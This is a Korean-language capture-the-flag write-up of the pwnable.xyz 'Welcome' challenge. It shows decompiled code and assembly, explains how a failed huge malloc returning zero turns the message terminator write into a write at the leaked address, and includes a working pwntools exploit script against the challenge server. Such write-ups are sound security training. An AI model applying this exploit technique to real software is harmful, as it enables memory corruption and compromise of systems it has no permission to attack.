# [pwnable.xyz] Welcome

> Are you worthy to continue?

## Analysis

```c
  mapped = malloc(0x40000uLL);
  *mapped = 1LL;
  _printf_chk(1LL, "Leak: %p\n", mapped);
```

`0x40000` 크기의 메모리를 동적 할당하여 주소를 `mapped`에 저장한다. 이 메모리의 첫 바이트에 1을 넣고, 메모리의 주소를 출력해준다.

```c
  _printf_chk(1LL, "Length of your message: ");
  size[0] = 0LL;
  _isoc99_scanf("%lu", size);
  message = (char *)malloc(size[0]);
  _printf_chk(1LL, "Enter your message: ");
  read(0, message, size[0]);
  v5 = size[0];
  message[size[0] - 1] = 0;
  write(1, message, v5);
```

원하는 크기로 `malloc()`을 호출하여 메모리를 할당받고 그 메모리에 메시지를 쓸 수 있다. 메시지의 마지막 1바이트를 0으로 덮어쓰고, 메시지를 출력한다.

```c
  if ( !*mapped )
    system("cat /flag");
```

`mapped`의 첫 바이트가 0이면 플래그를 얻을 수 있다.

## Exploit

`mapped`의 첫 바이트를 0으로 만들 수 있는 방법은, 메시지의 마지막 1바이트를 0으로 덮어쓰는 동작을 이용하는 것밖에 없다.

```
call    malloc
lea     rsi, aEnterYourMessa ; "Enter your message: "
mov     rbp, rax
mov     edi, 1
xor     eax, eax
call    __printf_chk
mov     rdx, [rsp+28h+size] ; nbytes
xor     edi, edi        ; fd
mov     rsi, rbp        ; buf
call    read
mov     rdx, [rsp+28h+size] ; n
mov     rsi, rbp        ; buf
mov     edi, 1          ; fd
mov     byte ptr [rbp+rdx-1], 0
```

위의 어셈블리 코드의 마지막 줄이 `message[size[0] - 1]`을 0으로 덮는 부분이다. `rbp`에는 `malloc()`의 반환값이 저장되어 있고, `rdx`에는 입력한 메모리 크기가 저장되어 있다.

Size로 매우 큰 값을 전달하여 `malloc()`을 호출하면 메모리가 정상적으로 할당되지 않고 0을 반환한다. `mapped + 1`을 입력하면 `rbp`는 0이 되고 `rdx`는 `mapped + 1`이 되어, 결과적으로 `mapped`의 첫 바이트가 0으로 덮어씌워지도록 만들 수 있다.

```python
# ex.py

from pwn import *

r = remote("svc.pwnable.xyz", 30000)

r.recvuntil(b"Leak: 0x")
mapped = int(r.recvline()[:-1], 16)

r.sendlineafter(b"Length of your message: ", str(mapped + 1).encode())
r.sendlineafter(b"Enter your message: ", b"")

r.interactive()
```

![image](https://github.com/user-attachments/assets/414e99e4-9885-4cdf-97c0-54103d5578a7)
